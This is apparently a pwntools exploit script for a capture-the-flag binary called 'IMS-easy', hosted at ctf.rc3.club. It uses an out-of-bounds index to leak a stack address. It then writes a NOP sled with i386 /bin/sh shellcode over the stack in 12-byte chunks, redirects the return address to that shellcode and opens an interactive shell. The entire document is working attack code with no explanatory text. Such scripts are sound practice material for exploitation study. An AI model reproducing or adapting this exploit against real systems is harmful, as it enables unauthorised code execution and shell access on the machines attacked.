from pwn import *
import numpy as np

def put(r, s):
    while len(s)%12:
        s += '\n'
    for j in [s[i:i+12] for i in range(0, len(s), 12)]:
        r.sendline("1")
        r.sendline(str(u32(j[-4:])))
        r.sendline(j[:-4])

e = ELF("IMS-easy")
if args['REMOTE']:
    r = remote("ctf.rc3.club", 7777)
else:
    r = process(e.path)
    gdb.attach(r, "b 39")
r.sendline("3")
r.sendline("-3")
r.recvuntil("ID: ")
stack_leak = int(r.recvuntil(",")[:-1], 10)
log.success("leaked stack addr: " + hex(np.uint32(stack_leak)))
scaddr = stack_leak
sc = "\x90"*20 + asm(shellcraft.i386.linux.sh())
buf = fit({0:sc}, length=80) + p32(np.uint32(scaddr))
log.info("Sending payload...")
put(r, buf)
r.sendline("4")
r.recvrepeat(1)
r.sendline("id")
r.interactive()
